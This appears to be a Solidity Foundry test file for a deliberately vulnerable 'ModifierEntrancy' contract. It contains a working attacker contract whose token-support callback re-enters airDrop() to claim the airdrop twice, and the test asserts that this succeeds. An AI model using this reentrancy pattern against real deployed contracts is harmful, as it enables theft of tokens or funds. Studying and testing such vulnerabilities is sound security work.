
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ModifierEntrancy, Bank, attack} from "../src/ModifierEntrancy.sol";

contract TestReentrancyModifierEntrancy is Test {
    ModifierEntrancy public _contractUnderTest;
    AttackerContract public _attacker;

    function setUp() public {
        _contractUnderTest = new ModifierEntrancy();
        _attacker = new AttackerContract(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes() public {
        uint256 initialBalance = _contractUnderTest.tokenBalance(address(_attacker));
        assertEq(initialBalance, 0, "Initial balance should be 0");

        _attacker.attack();

        uint256 finalBalance = _contractUnderTest.tokenBalance(address(_attacker));
        
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
        assertGt(finalBalance, 20, "Attack should result in more than 20 tokens due to reentrancy");
        assertEq(finalBalance, 40, "Attack should result in exactly 40 tokens (2 x 20 from reentrancy)");
    }

    receive() external payable {}
}

contract AttackerContract {
    ModifierEntrancy public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    bool private hasBeenCalled;

    constructor(address victimAddress) {
        victim = ModifierEntrancy(victimAddress);
    }

    function supportsToken() external returns (bytes32) {
        if (!hasBeenCalled) {
            hasBeenCalled = true;
            attackCallCount++;
            victim.airDrop();
        }
        return keccak256(abi.encodePacked("Nu Token"));
    }

    function attack() public {
        attackCallCount = 0;
        hasBeenCalled = false;
        exploitSucceeded = false;

        uint256 initialBalance = victim.tokenBalance(address(this));

        victim.airDrop();

        uint256 finalBalance = victim.tokenBalance(address(this));

        if (finalBalance > 20 && finalBalance > initialBalance + 20) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {}
}
